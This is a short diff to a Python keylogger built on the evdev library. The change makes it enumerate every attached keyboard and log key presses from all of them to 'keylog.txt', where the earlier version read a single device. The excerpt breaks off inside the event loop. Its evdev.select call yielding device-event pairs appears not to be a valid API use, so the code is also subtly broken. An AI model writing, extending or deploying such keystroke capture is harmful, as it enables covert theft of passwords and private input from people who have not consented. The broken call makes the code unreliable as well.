@@ -1,13 +1,20 @@
 import evdev
 
-from evdev import InputDevice
+from evdev import InputDevice, ecodes
 
-device=InputDevice('/dev/input/event2')
+devices=evdev.list_devices()
 
-print(device.name)
+keyboards = []
+for path in devices:
+    device = InputDevice(path) 
+    if ecodes.EV_KEY in device.capabilities() and ecodes.KEY_A in device.capabilities().get(ecodes.EV_KEY, []): 
+            keyboards.append(device)
+
+print(keyboards)
+
 log_file = open('keylog.txt','a',buffering=1)
 try:
-    for event in device.read_loop():
+    for device, event in evdev.select(keyboards):
 
         if event.type == 1 and event.value == 1:
 
